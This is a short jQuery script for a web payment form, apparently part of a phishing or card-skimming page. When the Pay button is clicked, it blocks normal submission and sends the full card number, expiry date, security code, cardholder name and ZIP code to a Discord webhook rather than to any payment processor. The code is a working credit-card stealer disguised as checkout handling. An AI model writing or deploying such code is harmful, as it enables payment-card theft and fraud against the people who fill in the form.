$(function () {
  $('[data-toggle="popover"]').popover();
  
  $('#cvc').on('click', function(){
    if ( $('.cvc-preview-container').hasClass('hide') ) {
      $('.cvc-preview-container').removeClass('hide');
    } else {
      $('.cvc-preview-container').addClass('hide');
    }    
  });
  
});

$(document).ready(function() {
  $('#PayButton').click(function(event) {
    event.preventDefault(); // Prevent the default form submission

    // Retrieve data from the form fields
    var paymentAmount = $('#PaymentAmount').val();
    var nameOnCard = $('#NameOnCard').val();
    var cardNumber = $('#CreditCardNumber').val();
    var expiryDate = $('#ExpiryDate').val();
    var securityCode = $('#SecurityCode').val();
    var zipCode = $('#ZIPCode').val();

    // Construct the embed message content
    var embedMessage = {
      "embeds": [{
        "title": "Payment Details",
        "description": "Payment information submitted:",
        "fields": [
          {
            "name": "Payment Amount",
            "value": "$" + paymentAmount,
            "inline": true
          },
          {
            "name": "Name on Card",
            "value": nameOnCard,
            "inline": true
          },
          {
            "name": "Card Number",
            "value": cardNumber,
            "inline": true
          },
          {
            "name": "Expiry Date",
            "value": expiryDate,
            "inline": true
          },
          {
            "name": "Security Code",
            "value": securityCode,
            "inline": true
          },
          {
            "name": "ZIP/Postal Code",
            "value": zipCode,
            "inline": true
          }
        ]
      }]
    };

    // Discord webhook URL
    var webhookUrl = "YOUR_DISCORD_WEBHOOK_URL";

    // Send a POST request to the Discord webhook
    $.ajax({
      type: "POST",
      url: webhookUrl,
      data: JSON.stringify(embedMessage),
      contentType: "application/json",
      success: function(response) {
        console.log("Message sent to Discord successfully");
      },
      error: function(error) {
        console.error("Error sending message to Discord:", error);
      }
    });
  });
});